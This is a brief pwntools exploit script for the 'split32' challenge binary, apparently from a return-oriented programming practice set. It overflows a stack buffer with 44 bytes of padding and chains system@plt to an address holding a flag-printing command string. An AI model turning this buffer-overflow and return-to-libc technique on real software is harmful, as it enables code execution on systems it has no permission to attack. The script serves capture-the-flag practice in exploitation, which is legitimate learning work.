from pwn import *
p = process('./split32')
offset = 44
system_plt = p32(0x8048430)
useful = p32(0x08048649) #calls bin/ls
flag = p32(0x804a030)
payload = "A"*offset + system_plt + "BBBB" + flag

p.sendline(payload)
p.interactive()
